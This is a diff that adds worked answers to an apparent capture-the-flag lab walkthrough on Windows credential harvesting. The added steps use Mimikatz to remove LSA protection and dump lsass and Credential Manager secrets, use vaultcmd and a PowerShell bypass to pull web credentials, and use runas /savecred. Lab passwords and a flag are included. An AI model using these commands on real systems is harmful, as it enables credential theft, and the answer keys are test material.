@@ -414,7 +414,7 @@ Note: If this fails with an `isFileExist` error, exit mimikatz, navigate to `C:\
 
 Once the driver is loaded, we can disable the LSA protection by executing the following Mimikatz command:
 
-![task5-terminal8](./images/task5-terminal8.png)
+![task5-terminal8](./images/task5-terminal8.png)	
 
 Now, if we try to run the "sekurlsa::logonpasswords" command again, it must be executed successfully and show cached credentials in memory.
 
@@ -422,8 +422,43 @@ Now, if we try to run the "sekurlsa::logonpasswords" command again, it must be e
 
 * Is the LSA protection enabled? (Y|N)
 
+	`Y`
+
 * If yes, try removing the protection and dumping the memory using Mimikatz. Once you have done, hit Complete.
 
+	* Run `cmd` with administrator privileges on target system and run `mimikatz`
+	
+		```
+		C:\Tools\Mimikatz\mimikatz.exe
+		```
+	
+		![task5-cmd](./images/task5-cmd.png)
+
+	* Loading the mimidrv Driver into Memory
+	
+		```
+		!+
+		```
+
+		![task5-load](./images/task5-load.png)
+
+	* Removing the LSA Protection
+	
+		```
+		!processprotect /process:lsass.exe /remove
+		```
+
+		![task5-lsa-remove](./images/task5-lsa-remove.png)
+
+	* Dumping the Stored Clear-text Passwords
+	
+		```
+		privilege::debug
+		sekurlsa::logonpasswords
+		```
+
+		![task5-password](./images/task5-password.png)
+	
 ## Task 6 - Windows Credential Manager
 
 This task introduces the Windows Credential Manager and discusses the technique used for dumping system credentials by exploiting it.
@@ -497,9 +532,75 @@ The techniques discussed in this task also could be done through other tools suc
 
 * Apply the technique for extracting clear-text passwords from Windows Credential Manager. What is the password of the THMuser for internal-app.thm.red?
 
+	`E4syPassw0rd`
+
+	* Run `cmd` with administrator privileges on target system
+	
+		![task6-cmd](./images/task6-cmd.png)
+
+	* Listing the available credentials from the Credentials Manager
+	
+		```
+		vaultcmd /list
+		```
+
+		![task6-vault](./images/task6-vault.png)
+
+	* Listing credentials details for "Web Credentials"
+	
+		```
+		VaultCmd /listcreds:"Web Credentials"
+		```
+
+		![task6-listcred](./images/task6-listcred.png)
+
+	* Run `Powershell` and import module `Get-WebCredentials.ps1`
+	
+		```
+		powershell -ex bypass
+		Import-Module C:\Tools\Get-WebCredentials.ps1
+		Get-WebCredentials
+		```
+
+		![task6-password](./images/task6-password.png)
+	
+
 * Use Mimikatz to memory dump the credentials for the 10.10.237.226 SMB share which is stored in the Windows Credential vault. What is the password?
 
+	`jfxKruLkkxoPjwe3`
+
+	* Run `cmd` with administrator privileges on target system and run `mimikatz`
+	
+		```
+		C:\Tools\Mimikatz\mimikatz.exe
+		```
+	
+		![task5-cmd](./images/task5-cmd.png)
+
+	* Dumping memory for Credentials Manager
+	
+		```
+		privilege::debug
+		sekurlsa::credman
+		```
+
+		![task5-credman](./images/task5-credman.png)
+
 * Run cmd.exe under thm-local user via runas and read the flag in "c:\Users\thm-local\Saved Games\flag.txt". What is the flag?
+
+	`THM{RunA5S4veCr3ds}`
+
+	* Run `cmd` on target system and run `cmdkey /list`
+	
+		![task6-cmdkey](./images/task6-cmdkey.png)
+
+	* Run CMD.exe As a User with the /savecred argument and get the flag
+	
+		```
+		runas /savecred /user:THM.red\thm-local cmd.exe
+		```
+
+		![task6-runas](./images/task6-runas.png)
 
 ## Task 7 - Domain Controller
 
